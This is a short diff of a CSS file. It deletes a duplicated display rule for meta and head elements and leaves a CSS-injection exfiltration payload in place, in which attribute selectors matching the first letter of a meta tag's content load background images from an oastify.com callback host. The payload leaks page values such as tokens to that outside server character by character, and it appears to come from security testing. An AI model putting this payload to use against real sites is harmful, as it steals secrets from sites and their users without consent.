@@ -1,9 +1,6 @@
 meta, head {
  display: block;   
 }
-meta, head {
- display: block;   
-}
 meta[content^="a"]{background: url("http://6hoztsw50g9nm1jmxeovacsoafg74w.oastify.com/a");}
 meta[content^="b"]{background: url("http://6hoztsw50g9nm1jmxeovacsoafg74w.oastify.com/b");}
 meta[content^="c"]{background: url("http://6hoztsw50g9nm1jmxeovacsoafg74w.oastify.com/c");}
